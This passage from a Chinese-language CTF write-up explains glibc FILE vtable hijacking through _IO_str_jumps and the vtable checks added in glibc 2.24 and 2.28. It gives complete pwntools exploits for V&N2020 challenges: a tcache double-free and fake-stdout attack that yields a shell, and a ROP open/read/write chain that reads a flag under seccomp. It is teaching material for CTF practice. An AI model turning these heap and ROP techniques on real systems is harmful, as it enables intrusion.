class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line">libc_hidden_def (_IO_puts)</span><br></pre></td></tr></table></figure>

<p>观察到其会使用宏<code>_IO_sputn</code>，该宏定义于libio&#x2F;libioP.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>套娃宏，跟进：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_OFFSET 0</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br></pre></td></tr></table></figure>

<p>即<strong>puts函数最终会调用vtable表中的</strong><code>__xsputn</code><strong>函数指针</strong>，gdb调试我们可以知道其相对表头偏移应当为<code>0x30</code>（64位下）</p>
<p><img src="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png"></p>
<p>由于<strong>自libc2.24始增加了对vtable表的合法性检测，故我们只能执行位于合法vtable表范围内的函数指针</strong></p>
<p>考虑到<strong>_IO_str_finish函数会将FILE指针 + 0xE8的位置作为一个函数指针执行</strong>，故我们选择修改_IO_2_1_stdout_的vtable表至特定位置以<strong>调用_IO_str_finish函数</strong></p>
<p>表_IO_str_jumps中存在着我们想要利用的_IO_str_finish函数的指针，且该表是一个合法vtable表，故只要我们<strong>将stdout的vtable表劫持到_IO_str_finish附近即可成功调用_IO_str_finish函数</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png"></p>
<p>由_IO_jump_t结构体的结构我们不难计算出fake vtable的位置应当为<strong>_IO_str_jumps - 0x28</strong></p>
<p>劫持vtable表后在_IO_2_1_stdout_ + 0xE8的位置放上one_gadget，即可在程序调用puts函数时get shell</p>
<p>通过gdb调试可以帮助我们更好地构造fake _IO_2_1_stdout_结构体</p>
<p><img src="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png"></p>
<p><img src="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png"></p>
<p>需要注意的一点是有少部分符号无法直接通过sym字典获得，我们在这里采用其相对偏移以计算其真实地址，详见注释</p>
<p><img src="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png"></p>
<p>故最后构造的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26233)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x07&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x07&quot;</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake file structure</span></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFBAD2886</span>) <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">7</span> <span class="comment"># from _IO_read_ptr to _IO_buf_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">1</span>) <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] + <span class="number">0xc0</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc_base + one_gadget) <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the _IO_2_1_stdout and its vtable</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x10&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, fake_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png"></p>
<blockquote>
<h4 id="IO-FILE-plus结构体中-vtable-相对偏移"><a href="#IO-FILE-plus结构体中-vtable-相对偏移" class="headerlink" title="_IO_FILE_plus结构体中 vtable 相对偏移"></a>_IO_FILE_plus结构体中 vtable 相对偏移</h4><blockquote>
<p> 在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 </p>
<p> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">ctf-wiki: FILE structure</a></p>
</blockquote>
<h4 id="vtable-合法性检测-start-from-glibc2-24"><a href="#vtable-合法性检测-start-from-glibc2-24" class="headerlink" title="vtable 合法性检测(start from glibc2.24)"></a>vtable 合法性检测(start from glibc2.24)</h4><p>自从glibc2.24版本起便增加了对于vtable的检测，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">section.  */</span></span><br><span class="line"><span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line"><span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line"><span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line"><span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment"> slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">_IO_vtable_check ();</span><br><span class="line"><span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试可知这个section_length的长度为3432（0xd68）：</p>
<p><img src="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png"></p>
<p>由此，我们所构造的fake vtable的位置受到了一定的限制，即只能在<code>__start___libc_IO_vtables</code>往后0xd68字节的范围内</p>
<h4 id="vtable表劫持姿势-under-glibc2-28"><a href="#vtable表劫持姿势-under-glibc2-28" class="headerlink" title="vtable表劫持姿势(under glibc2.28)"></a>vtable表劫持姿势(under glibc2.28)</h4><p>在glibc2.28往前的版本中<strong>_IO_str_finish函数会将_IO_2_1_stdout_ + 0xE8的位置作为一个函数指针执行</strong>，故我们通常考虑在这个位置放上我们想要执行的指令地址（如one_gadget）并将vtable表劫持到适合的位置以执行<code>_IO_str_finish()</code>函数</p>
<p>通常情况下，我们考虑<strong>劫持_IO_2_1_stdout_并修改其vtable表至表_IO_str_jumps附近</strong>，该vtable表定义于libio&#x2F;sstrops.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">JUMP_INIT(read, _IO_default_read),</span><br><span class="line">JUMP_INIT(write, _IO_default_write),</span><br><span class="line">JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">JUMP_INIT(close, _IO_default_close),</span><br><span class="line">JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>不难看出，在<strong>该表中有我们所需的_IO_str_finish函数，且该表本身便是vtable表列表中的一个表</strong>，能很好地通过vtable表合法性检测，因此我们劫持stdout时便尝将fake vtable劫持到该表附近</p>
<p>需要注意的一点是我们需要<strong>修改_IO_2_1_stdout的flag的最后一位为0以通过_IO_str_finish函数中的检测</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio/strops.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br></pre></td></tr></table></figure>

<p>64位下其会<strong>将fp + 0d8 + 0x10的位置作为函数指针进行调用</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png"></p>
<p>需要注意的是<strong>这种利用方式仅适用于glibc2.28以下的版本，自glibc2.28始该段代码被修改，无法再通过同种方式进行利用</strong></p>
<p>自glibc2.28始，该函数<strong>不会调用额外的函数指针</strong>，而是会<code>直接使用free()</code>，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似地，<strong>对于_IO_str_overflow的利用自glibc2.28始同样失效</strong>，源码比较长就不在这里贴出了</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish">ctf-wiki: exploit in libc2.24</a></p>
</blockquote>
<h2 id="V-amp-N2020-公开赛-warmup-orw"><a href="#V-amp-N2020-公开赛-warmup-orw" class="headerlink" title="[V&amp;N2020 公开赛]warmup - orw"></a>[V&amp;N2020 公开赛]warmup - orw</h2><p>惯例的<code>checksec</code>，发现除了canary都开了</p>
<p><img src="https://i.loli.net/2021/02/01/HuhItcg2VKGFSfb.png"></p>
<p>拖入IDA进行分析</p>
<p>在一开始给了puts的地址，可以获得libc基址</p>
<p><img src="https://i.loli.net/2021/02/01/74mohztTiKn21Yj.png"></p>
<p>第一个函数调用了prctl，疑似限制系统调用，使用<code>seccomp-tools</code>发现确实限制了系统调用， 无法get shell，考虑进行orw</p>
<p><img src="https://i.loli.net/2021/02/01/8lyD761NtwWjoCJ.png"></p>
<p>在<code>sub_9D3()</code>函数中可以进行大量输入，不过无法溢出</p>
<p><img src="https://i.loli.net/2021/02/01/F4sdqMlYTVDjp6n.png"></p>
<p>在<code>sub_9A1()</code>函数中可以溢出0x10个字节，<strong>刚好可以配合csu中gadget与上一层函数调用栈联通</strong></p>
<p><img src="https://i.loli.net/2021/02/01/BRm376G9Ikjb4vJ.png"></p>
<p>由于开启了PIE，没法直接获取到bss段的地址，而又有libc基址，故考虑使用__free_hook作为读写区域</p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 28779)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here is my gift: &quot;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">log.info(addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">ret = libc_base + libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)).__next__()</span><br><span class="line">flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">10</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]) <span class="comment"># read str &#x27;flag&#x27; from input</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])<span class="comment"># open file &#x27;flag&#x27;</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])<span class="comment"># read flag from file ptr 3(opened by open())</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset  + p64(<span class="number">0xdeadbeef</span>) + p64(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/02/01/gvyxEP6DSI3zwFr.png"></p>
<h2 id="V-amp-N2020-公开赛-babybabypwn-SROP-orw"><a href="#V-amp-N2020-公开赛-babybabypwn-SROP-orw" class="headerlink" title="[V&amp;N2020 公开赛]babybabypwn - SROP + orw"></a>[V&amp;N2020 公开赛]babybabypwn - SROP + orw</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/03/28/8cBI91MdZ6Fkh4P.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>设置了 <code>seccomp</code> 没法拿shell，考虑走 orw 拿flag</p>
